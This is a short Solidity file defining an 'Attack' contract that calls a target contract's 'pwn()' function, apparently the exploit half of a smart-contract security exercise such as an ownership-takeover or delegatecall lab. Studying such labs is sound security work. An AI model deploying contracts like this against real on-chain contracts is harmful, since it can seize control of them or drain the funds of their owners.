// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        (bool ok, ) = hackMe.call(abi.encodeWithSignature("pwn()"));
        require(ok, "Call failed");
    }
}
